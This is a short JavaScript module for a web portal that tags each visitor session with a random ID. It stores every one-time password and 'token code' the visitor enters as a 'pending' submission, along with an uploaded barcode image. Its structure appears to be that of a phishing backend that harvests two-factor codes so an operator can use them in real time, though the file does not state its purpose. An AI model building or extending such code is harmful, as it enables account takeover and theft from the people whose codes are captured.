import { base44 } from "@/api/base44Client";

export function getSessionId() {
  let id = sessionStorage.getItem("portal_session_id");
  if (!id) {
    id = "S-" + Math.floor(100000 + Math.random() * 900000);
    sessionStorage.setItem("portal_session_id", id);
  }
  return id;
}

export async function upsertSubmission(fields) {
  const session_id = getSessionId();
  try {
    const existing = await base44.entities.PortalSubmission.filter(
      { session_id },
      "-created_date",
      1
    );
    if (existing.length > 0) {
      return await base44.entities.PortalSubmission.update(existing[0].id, fields);
    }
    return await base44.entities.PortalSubmission.create({ session_id, ...fields });
  } catch (e) {
    return null;
  }
}

async function appendCode(arrayField, singleField, statusField, code) {
  const session_id = getSessionId();
  try {
    const existing = await base44.entities.PortalSubmission.filter(
      { session_id },
      "-created_date",
      1
    );
    if (existing.length > 0) {
      const cur = existing[0];
      const arr = Array.isArray(cur[arrayField]) ? [...cur[arrayField], code] : [code];
      return await base44.entities.PortalSubmission.update(cur.id, {
        [singleField]: code,
        [arrayField]: arr,
        [statusField]: "pending",
      });
    }
    return await base44.entities.PortalSubmission.create({
      session_id,
      [singleField]: code,
      [arrayField]: [code],
      [statusField]: "pending",
    });
  } catch (e) {
    return null;
  }
}

export const appendOtpCode = (code) =>
  appendCode("otp_codes", "otp_code", "otp_status", code);
export const appendTokenCode = (code) =>
  appendCode("token_codes", "token_code", "token_status", code);

export async function setBarcodeImage(fileUrl) {
  return upsertSubmission({ barcode_image: fileUrl });
}